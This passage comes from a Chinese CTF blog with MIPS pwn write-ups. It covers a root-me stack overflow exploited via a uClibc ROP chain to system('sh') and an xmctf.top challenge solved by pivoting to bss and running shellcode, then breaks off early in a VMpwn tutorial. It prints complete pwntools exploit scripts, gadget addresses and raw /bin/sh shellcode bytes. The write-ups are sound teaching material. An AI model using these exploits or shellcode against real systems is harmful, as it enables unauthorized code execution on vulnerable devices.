    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Enter your passphrase: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">fgets</span><span class="token punctuation">(</span>acStack136<span class="token punctuation">,</span><span class="token number">0x200</span><span class="token punctuation">,</span><span class="token constant">stdin</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    iVar1 <span class="token operator">=</span> <span class="token function">strncmp</span><span class="token punctuation">(</span>acStack136<span class="token punctuation">,</span><span class="token string">"$MyPasswordPoorlySecured!"</span><span class="token punctuation">,</span><span class="token number">0x19</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>iVar1 <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">break</span><span class="token punctuation">;</span>
    bStack144 <span class="token operator">=</span> bStack144 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"\nAccess granted!.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>分析main函数，我们有三次输入的机会，存在明显的栈溢出</p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">char</span> acStack136 <span class="token punctuation">[</span><span class="token number">128</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token function">fgets</span><span class="token punctuation">(</span>acStack136<span class="token punctuation">,</span><span class="token number">0x200</span><span class="token punctuation">,</span><span class="token constant">stdin</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
<p>fgets接受0x200个字节的输入，而缓冲区大小只有128字节，当输入为<strong>$MyPasswordPoorlySecured!</strong>时就退出while循环</p>
<p>我们动态调试一下来确定偏移量，使用cyclic 200生成200个字符，然后输入进去</p>
<p><img src="/LawlietLW.github.io/2020/08/04/lock-mipspwn-xue-xi/14.jpg" alt=""></p>
<p>程序崩溃，然后确定偏移量</p>
<p><img src="/LawlietLW.github.io/2020/08/04/lock-mipspwn-xue-xi/15.jpg" alt=""></p>
<p>offset=132,我们再来验证一下，我们使用cyclic生成132个字符再加上BBBB</p>
<p><img src="/LawlietLW.github.io/2020/08/04/lock-mipspwn-xue-xi/16.jpg" alt=""></p>
<p>可以看到，返回地址确实被覆盖成了BBBB</p>
<p>确定了返回地址，该怎么利用</p>
<p>由于远程环境未开启ASLR且程序未开启PIE，所以libc加载地址是不变的，我们无需泄露libc地址，直接vmmap查看libc加载地址即可</p>
<p><img src="/LawlietLW.github.io/2020/08/04/lock-mipspwn-xue-xi/17.jpg" alt=""></p>
<p>可以查看到libc基地址为<strong>0x76637000</strong></p>
<p>然后我们要构造出system(‘/bin/sh’),有了libc基地址，system和binsh字符串的地址也知道了，接下来查找gadget，IDA加载libc.so.6，使用<strong>mipsrop.stackfinder()</strong>命令查找用于栈的gadgets</p>
<p><img src="/LawlietLW.github.io/2020/08/04/lock-mipspwn-xue-xi/18.jpg" alt=""></p>
<p>我们需要控制$a0，用于存放binsh的地址，我们选择<strong>0x0012BAA4</strong>位置处的gadget来操作，如下</p>
<pre class=" language-assembly"><code class="language-assembly">.text:0012BAA4                 move    $t9, $s0
.text:0012BAA8                 jalr    $t9 ; pipe
.text:0012BAAC                 addiu   $a0, $sp, 0x24  # '$'</code></pre>
<p>这一处gadget会将<strong>$sp+0x24</strong>处的值作为<strong>$a0</strong>的值，所以<strong>$sp+0x24</strong>处我们要填上binsh的地址，然后会跳转到$s0寄存器指向的地址处，所以<strong>$s0</strong>我们要设置为system函数的地址，为了方便说明，我们称这个gadget为<strong>gadget_a0</strong></p>
<p>要完成<strong>gadget_a0</strong>，我们需要先设置好$s0寄存器的值，uclibc中有一个类似于x86-64架构下的通用gadget，可以设置我们要用到的绝大多数的寄存器的值，<strong>位于 <code>scandir</code> 或者 <code>scandir64</code>尾部</strong>，如下所示</p>
<pre class=" language-assembly"><code class="language-assembly">.text:000AE818                 lw      $ra, 0x40+var_4($sp)
.text:000AE81C                 move    $v0, $s6
.text:000AE820                 lw      $s7, 0x40+var_8($sp)
.text:000AE824                 lw      $s6, 0x40+var_C($sp)
.text:000AE828                 lw      $s5, 0x40+var_10($sp)
.text:000AE82C                 lw      $s4, 0x40+var_14($sp)
.text:000AE830                 lw      $s3, 0x40+var_18($sp)
.text:000AE834                 lw      $s2, 0x40+var_1C($sp)
.text:000AE838                 lw      $s1, 0x40+var_20($sp)
.text:000AE83C                 lw      $s0, 0x40+var_24($sp)
.text:000AE840                 jr      $ra
.text:000AE844                 addiu   $sp, 0x40</code></pre>
<p>利用这个gadget，我们可以将$s0设置为system函数的地址，将这个gadget执行完后的返回值设置为gadget_a0的地址，即在<strong>$sp+0x3c</strong>的位置处填入gadget_a0的地址，类似的我们称这个gadget为<strong>gadget_s0</strong></p>
<p>于是，我们整个payload的结构图如下</p>
<p><img src="/LawlietLW.github.io/2020/08/04/lock-mipspwn-xue-xi/1.png" alt=""></p>
<p>详细地解释一下这个流程，首先偏移量132，随后将返回地址覆盖为gadget_s0，然后由于这一句</p>
<pre class=" language-assembly"><code class="language-assembly">lw      $s0, 0x40+var_24($sp)</code></pre>
<p>将0x1c($sp)位置处的值写入$s0，所以$sp+0x1c处我们填充为system地址，而由于当程序执行gadget_s0时，gadget_s0就是sp所指向的位置，所以直接填充0x1c个垃圾字符后接上system地址即可，由于返回地址为</p>
<pre class=" language-assembly"><code class="language-assembly">lw      $ra, 0x40+var_4($sp)</code></pre>
<p>即相对于返回地址位置+0x3c处要填充为gadget_a0的地址，‘A’*0X1C+system(4字节)=0x20字节，所以在system后再填充(0x3c-0x20)个字节的垃圾字符，然后再填充gadget_a0的地址，再填充0x24个垃圾字节，最后写入binsh的地址</p>
<p>不过这样子的exp写完会有点问题，发生在执行system(“/bin/sh”)的时候，如下</p>
<p><img src="/LawlietLW.github.io/2020/08/04/lock-mipspwn-xue-xi/21.jpg" alt=""></p>
<p>也不想调试到底是哪里发生了问题，作为替代，我将binsh的地址直接替换为sh\x00\x00，然后就可以打通了，exp如下</p>
<pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span>
<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>
context<span class="token punctuation">.</span>arch <span class="token operator">=</span> <span class="token string">'mips'</span>
context<span class="token punctuation">.</span>endian <span class="token operator">=</span> <span class="token string">'big'</span>

io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'qemu-mips'</span><span class="token punctuation">,</span> <span class="token string">'-L'</span><span class="token punctuation">,</span> <span class="token string">'./'</span><span class="token punctuation">,</span> <span class="token string">'./ch64'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token comment" spellcheck="true">#io = process(['qemu-mips', '-L', './', '-g', '1234', './ch64'])</span>
libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'lib/libc.so.6'</span><span class="token punctuation">)</span>
libc_base <span class="token operator">=</span> <span class="token number">0x76637000</span>
system_addr <span class="token operator">=</span> libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>
binsh_addr <span class="token operator">=</span> libc_base<span class="token operator">+</span><span class="token number">0x00164fac</span>
gadget_a0 <span class="token operator">=</span> <span class="token number">0x0012BAA4</span><span class="token operator">+</span>libc_base
gadget_s0 <span class="token operator">=</span> <span class="token number">0x000AE818</span><span class="token operator">+</span>libc_base

log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'system_addr => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'binsh_addr => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>binsh_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'gadget_a0 => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>gadget_a0<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'gadget_s0 => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>gadget_s0<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token triple-quoted-string string">'''
payload = 'A'*0x40
payload += p32(0x409010)
payload += 'A'*0x40
'''</span>
payload <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">132</span>
payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>gadget_s0<span class="token punctuation">)</span>
payload <span class="token operator">+=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">0x1c</span>
payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span>
payload <span class="token operator">+=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">0x1c</span>
payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>gadget_a0<span class="token punctuation">)</span>
payload <span class="token operator">+=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">0x24</span>
payload <span class="token operator">+=</span> <span class="token string">'sh'</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span>
io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Enter your passphrase: '</span><span class="token punctuation">)</span>
io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Enter your passphrase: '</span><span class="token punctuation">)</span>
io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'$MyPasswordPoorlySecured!'</span><span class="token punctuation">)</span>
io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>
<p><img src="/LawlietLW.github.io/2020/08/04/lock-mipspwn-xue-xi/22.jpg" alt=""></p>
<h2 id="0x3-xmctf-top-mipspwn"><a href="#0x3-xmctf-top-mipspwn" class="headerlink" title="0x3.xmctf.top-mipspwn"></a>0x3.xmctf.top-mipspwn</h2><p>下载下来有两个libc文件和一个可执行文件，checksec检查一下</p>
<p><img src="/LawlietLW.github.io/2020/08/04/lock-mipspwn-xue-xi/23.jpg" alt=""></p>
<p>32位小端序，无保护</p>
<p>file一下</p>
<p><img src="/LawlietLW.github.io/2020/08/04/lock-mipspwn-xue-xi/24.jpg" alt=""></p>
<p>静态编译，所以这个lib文件夹并没有什么用</p>
<p>分别用ghidra和IDA加载题目，ghidra查看伪代码</p>
<p>main函数和漏洞函数分别如下</p>
<pre class=" language-c"><code class="language-c">undefined4 <span class="token function">main</span><span class="token punctuation">(</span>EVP_PKEY_CTX <span class="token operator">*</span>param_1<span class="token punctuation">)</span>

<span class="token punctuation">{</span>
  <span class="token function">init</span><span class="token punctuation">(</span>param_1<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"what is your name?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>a<span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">vul</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<pre class=" language-c"><code class="language-c">undefined4 <span class="token function">vul</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span>

<span class="token punctuation">{</span>
  undefined auStack64 <span class="token punctuation">[</span><span class="token number">56</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"just do it~"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>auStack64<span class="token punctuation">,</span><span class="token number">0xb0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>c</code></pre>
<p>read读入的字节数大于缓冲区的大小，造成溢出</p>
<p>注意到存在一个<strong>backdoor</strong>函数，查看一下</p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">backdoor</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span>

<span class="token punctuation">{</span>
  <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"how are you?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<p>并没有什么🥚用，只是提供了一个system函数</p>
<p>IDA使用mipsrop查找一下gadget</p>
<p><img src="/LawlietLW.github.io/2020/08/04/lock-mipspwn-xue-xi/27.jpg" alt=""></p>
<p>虽然是静态编译，但可用的gadget非常少</p>
<p>而用于栈的gadget只有一条，还是为$a1赋值</p>
<p><img src="/LawlietLW.github.io/2020/08/04/lock-mipspwn-xue-xi/28.jpg" alt=""></p>
<p>所以我们得换个思路，gadget不足，不能用rop来getshell，但程序没有NX保护，所以我们便采用ret2shellcode来利用</p>
<p>首先确定一下偏移量大小</p>
<p><img src="/LawlietLW.github.io/2020/08/04/lock-mipspwn-xue-xi/29.jpg" alt=""></p>
<p>glibcpwn中，ret2shellcode有时会利用read函数往bss端读入shellcode然后跳转到bss段执行，这题的利用手法也类似，不过在这题中，我们并不能手动构造出read函数，而是借用vul函数中的read语句来执行，如下所示</p>
<pre class=" language-assembly"><code class="language-assembly">.text:00400484                 li      $a2, 0xB0
.text:00400488                 addiu   $v0, $fp, 0x58+var_40
.text:0040048C                 move    $a1, $v0
.text:00400490                 move    $a0, $zero
.text:00400494                 la      $v0, read
.text:00400498                 move    $t9, $v0
.text:0040049C                 bal     read</code></pre>
<p>注意到read函数的第二个参数，也就是读入的地址来源于$v0,而$v0又来源于$fp+0x58-0x40，继续往下看到vul函数结束的语句</p>
<pre class=" language-assembly"><code class="language-assembly">.text:004004B0                 lw      $ra, 0x58+var_4($sp)
.text:004004B4                 lw      $fp, 0x58+var_8($sp)
.text:004004B8                 addiu   $sp, 0x58
.text:004004BC                 jr      $ra</code></pre>
<p>vul函数结束时会还原栈帧，main函数的$fp的值会存在$ra的上方，函数结束时会将其取出放入$fp中，因此我们可以控制$fp的值，再将$ra覆盖为read功能开始处，也就是0x00400484，这样我们就能将shellcode写入别的位置，再将返回地址覆盖为shellcode写入的位置，返回后就会执行shellcode</p>
<p>先贴上exp</p>
<pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span>
<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">from</span> time <span class="token keyword">import</span> sleep
context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>
context<span class="token punctuation">.</span>arch <span class="token operator">=</span> <span class="token string">'mips'</span>
context<span class="token punctuation">.</span>endian <span class="token operator">=</span> <span class="token string">'little'</span>
<span class="token comment" spellcheck="true">#io = process(['./qemu-mipsel', '-g','1234', './pwn2'])</span>
<span class="token comment" spellcheck="true">#io=remote('xmctf.top',8905)</span>
io<span class="token operator">=</span>process<span class="token punctuation">(</span><span class="token string">'./pwn2'</span><span class="token punctuation">)</span>
elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'pwn2'</span><span class="token punctuation">)</span>
io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"what is your name?\n"</span><span class="token punctuation">)</span>
io<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">)</span>
io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'just do it~'</span><span class="token punctuation">)</span>
<span class="token comment" spellcheck="true">#shellcode = "\x28\x06\xff\xff\x3c\x0f\x2f\x2f\x35\xef\x62\x69\xaf\xaf\xff\xf4\x3c\x0e\x6e\x2f\x35\xce\x73\x68\xaf\xae\xff\xf8\xaf\xa0\xff\xfc\x27\xa4\xff\xf4\x28\x05\xff\xff\x24\x02\x0f\xab\x01\x01\x01\x0c"</span>
<span class="token comment" spellcheck="true">#shellcode = "\x24\x06\x06\x66\x04\xd0\xff\xff\x28\x06\xff\xff\x27\xbd\xff\xe0\x27\xe4\x10\x01\x24\x84\xf0\x1f\xaf\xa4\xff\xe8\xaf\xa0\xff\xec\x27\xa5\xff\xe8\x24\x02\x0f\xab\x01\x01\x01\x0c/bin/sh\x00"</span>
shellcode<span class="token operator">=</span><span class="token string">"\x50\x73\x06\x24\xff\xff\xd0\x04\x50\x73\x0f\x24\xff\xff\x06\x28\xe0\xff\xbd\x27\xd7\xff\x0f\x24\x27\x78\xe0\x01\x21\x20\xef\x03\xe8\xff\xa4\xaf\xec\xff\xa0\xaf\xe8\xff\xa5\x23\xab\x0f\x02\x24\x0c\x01\x01\x01/bin/sh"</span> 
bss <span class="token operator">=</span> elf<span class="token punctuation">.</span>bss<span class="token punctuation">(</span><span class="token punctuation">)</span>
read <span class="token operator">=</span> <span class="token number">0x400484</span>
payload <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">56</span>
payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>bss<span class="token operator">+</span><span class="token number">0x50</span><span class="token operator">-</span><span class="token number">0x58</span><span class="token operator">+</span><span class="token number">0x40</span><span class="token punctuation">)</span>
payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>read<span class="token punctuation">)</span>
io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
payload <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">60</span>
payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>bss<span class="token operator">+</span><span class="token number">0x50</span><span class="token operator">+</span><span class="token number">0x40</span><span class="token punctuation">)</span>
payload <span class="token operator">+=</span> shellcode

io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>
<p>由于偏移量为60，那么相对于fp就为56，我们的目标是往bss段写入shellcode，为避免bss开头存在某些值，选择往bss+0x50处写入shellcode</p>
<pre class=" language-assembly"><code class="language-assembly">addiu   $v0, $fp, 0x58+var_40</code></pre>
<p>因为是将<strong>$fp+0x58-0x40</strong>赋给$v0,为避免计算，我们将$fp设置为<strong>bss+0x50-0x58+0x40</strong>,这样赋给$v0的就是<strong>(bss+0x50-0x58+0x40)+0x58-0x40=bss+0x50</strong>，随后sleep(1),等待rop执行，接着就会执行第二次read，往bss+0x50读，实际上这就是一个栈迁移，将栈迁移到了bss段，这次就只需要覆盖$ra，将$ra修改为shellcode的地址。第二次read从bss+0x50开始，然后写入60(0x3c)个A，返回地址占四字节，加起来就是0x40个字节，返回地址之后就是shellcode，所以将返回地址修改为<strong>bss+0x50+0x40</strong>就好</p>
<p>执行效果如下</p>
<p><img src="/LawlietLW.github.io/2020/08/04/lock-mipspwn-xue-xi/30.jpg" alt=""></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>​        这三道题相信在做多了glibcpwn的师傅们看来都是基础题，需要注意的就是mips架构下的指令和寄存器的功能，以及叶子函数和非叶子函数的一点区别。不过在跟着《解密家用路由器0day漏洞挖掘技术》这本书进行一些路由器漏洞的复现时，发觉挺多路由器漏洞的利用难度也差不多是这个水平(当然也不能局限于这个难度，难题也还是有的)，路由器绝大部分无aslr，固件无保护，困难之处在于发现漏洞。当然也可能是因为我接触的少了，这本书上的几个漏洞也都是好几年前的了，现在的情况也应该有所变化。</p>
<p>​        最后，希望本篇文章能为像我一样刚入门的师傅们提供一点帮助。</p>
<p>参考链接：</p>
<ul>
<li><a href="https://www.root-me.org/en/Challenges/App-System/" target="_blank" rel="noopener">https://www.root-me.org/en/Challenges/App-System/</a></li>
<li><a href="https://www.cnblogs.com/hac425/p/9416864.html" target="_blank" rel="noopener">https://www.cnblogs.com/hac425/p/9416864.html</a></li>
<li><a href="https://blog.csdn.net/seaaseesa/article/details/105281585" target="_blank" rel="noopener">https://blog.csdn.net/seaaseesa/article/details/105281585</a></li>
</ul>
<script>
        document.querySelectorAll('.github-emoji')
          .forEach(el => {
            if (!el.dataset.src) { return; }
            const img = document.createElement('img');
            img.style = 'display:none !important;';
            img.src = el.dataset.src;
            img.addEventListener('error', () => {
              img.remove();
              el.style.color = 'inherit';
              el.style.backgroundImage = 'none';
              el.style.background = 'none';
            });
            img.addEventListener('load', () => {
              img.remove();
            });
            document.body.appendChild(img);
          });
      </script></div></div><a class="button-hover more" href="/LawlietLW.github.io/2020/08/04/lock-mipspwn-xue-xi/#more">阅读全文</a></div><div class="recent-post-item"><a class="post-title" href="/LawlietLW.github.io/2020/06/04/vmpwn-xue-xi/">VMpwn学习</a><div class="container"><time class="button-hover post-date"><i class="fas fa-calendar-alt article-icon" aria-hidden="true"></i> 更新于 2020-06-12</time><div class="button-hover categories"><i class="fa fa-inbox article-icon" aria-hidden="true"></i><a class="link-a" href="/LawlietLW.github.io/categories/CTF/">CTF</a></div><div class="button-hover tags"><i class="fa fa-tag article-icon" aria-hidden="true"></i><a class="link-a" href="/LawlietLW.github.io/tags/PWN/">PWN</a><span>&nbsp;|&nbsp;</span><i class="fa fa-tag article-icon" aria-hidden="true"></i><a class="link-a" href="/LawlietLW.github.io/tags/%E9%80%86%E5%90%91/">逆向</a></div></div><div class="post-content"><div class="main-content content"><p>新手向，会讲得比较详细，入门不易</p>
<p>虚拟机保护的题目相比于普通的pwn题逆向量要大许多，需要分析出分析出不同的opcode的功能再从中找出漏洞，实际上，vmpwn的大部分工作量都在逆向中，能分析出虚拟指令集的功能实现，要做出这道题也比较容易了。</p>
<p>先给出几个概念</p>
<h4 id="1-虚拟机保护技术"><a href="#1-虚拟机保护技术" class="headerlink" title="1.虚拟机保护技术"></a>1.虚拟机保护技术</h4><p>所谓虚拟机保护技术，是指将代码翻译为机器和人都无法识别的一串伪代码字节流；在具体执行时再对这些伪代码进行一一翻译解释，逐步还原为原始代码并执行。这段用于翻译伪代码并负责具体执行的子程序就叫作虚拟机VM（好似一个抽象的CPU）。它以一个函数的形式存在，函数的参数就是字节码的内存地址。</p>
<h4 id="2-VStartVM"><a href="#2-VStartVM" class="headerlink" title="2.VStartVM"></a>2.VStartVM</h4><p>虚拟机的入口函数，对虚拟机环境进行初始化</p>
<h4 id="3-VMDispather"><a href="#3-VMDispather" class="headerlink" title="3.VMDispather"></a>3.VMDispather</h4><p>解释opcode，并选择对应的Handler函数执行，当Handler执行完后会跳回这里，形成一个循环</p>
<h4 id="4-opcode"><a href="#4-opcode" class="headerlink" title="4.opcode"></a>4.opcode</h4><p>程序可执行代码转换成的操作码</p>
<p>流程图如下</p>
<p><img src="/LawlietLW.github.io/2020/06/04/vmpwn-xue-xi/D:%5CHexo%5Csource_posts%5CVMpwn%E5%AD%A6%E4%B9%A0%5C1.png" alt="1"></p>
<p>下面来看题</p>
<h2 id="0x1-ciscn-2019-qual-virtual"><a href="#0x1-ciscn-2019-qual-virtual" class="headerlink" title="0x1.ciscn_2019_qual_virtual"></a>0x1.ciscn_2019_qual_virtual</h2><p>首先检查保护</p>
<p><img src="/LawlietLW.github.io/2020/06/04/vmpwn-xue-xi/D:%5CHexo%5Csource_posts%5CVMpwn%E5%AD%A6%E4%B9%A0%5C1.jpg" alt="1"></p>
<p>无PIE</p>
<p>拖进IDA分析流程</p>
<p><img src="/LawlietLW.github.io/2020/06/04/vmpwn-xue-xi/D:%5CHexo%5Csource_posts%5CVMpwn%E5%AD%A6%E4%B9%A0%5C2.jpg" alt="2"></p>
<p>程序模拟了一个虚拟机，v5，v6，v7分别是stack段，text段和data段，set函数如下</p>
<pre class=" language-c"><code class="language-c">_DWORD <span class="token operator">*</span>__fastcall <span class="token function">set</span><span class="token punctuation">(</span><span class="token keyword">int</span> a1<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  _DWORD <span class="token operator">*</span>result<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// rax</span>
  _DWORD <span class="token operator">*</span>ptr<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+10h] [rbp-10h]</span>
  <span class="token keyword">void</span> <span class="token operator">*</span>s<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+18h] [rbp-8h]</span>

  ptr <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x10uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>ptr <span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
  s <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">8LL</span> <span class="token operator">*</span> a1<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> s <span class="token punctuation">)</span>
  <span class="token punctuation">{</span>
    <span class="token function">memset</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">8LL</span> <span class="token operator">*</span> a1<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span>ptr <span class="token operator">=</span> s<span class="token punctuation">;</span>
    ptr<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> a1<span class="token punctuation">;</span>
    ptr<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
    result <span class="token operator">=</span> ptr<span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">else</span>
  <span class="token punctuation">{</span>
    <span class="token function">free</span><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">;</span>
    result <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">return</span> result<span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<p>函数很简单，就不多说了</p>
<p>分配好各个段之后，首先往一个chunk上读入name，然后让我们输入指令，先写到一个0x400的缓冲区中，然后再写到text段中，store_opcode函数如下</p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">void</span> __fastcall <span class="token function">store_opcode</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>a2<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token keyword">int</span> v2<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+18h] [rbp-18h]</span>
  <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+1Ch] [rbp-14h]</span>
  <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>s1<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+20h] [rbp-10h]</span>
  _QWORD <span class="token operator">*</span>ptr<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+28h] [rbp-8h]</span>

  <span class="token keyword">if</span> <span class="token punctuation">(</span> a1 <span class="token punctuation">)</span>
  <span class="token punctuation">{</span>
    ptr <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">8LL</span> <span class="token operator">*</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    v2 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span> s1 <span class="token operator">=</span> <span class="token function">strtok</span><span class="token punctuation">(</span>a2<span class="token punctuation">,</span> delim<span class="token punctuation">)</span><span class="token punctuation">;</span> v2 <span class="token operator">&lt;</span> <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> s1<span class="token punctuation">;</span> s1 <span class="token operator">=</span> <span class="token function">strtok</span><span class="token punctuation">(</span><span class="token number">0LL</span><span class="token punctuation">,</span> delim<span class="token punctuation">)</span> <span 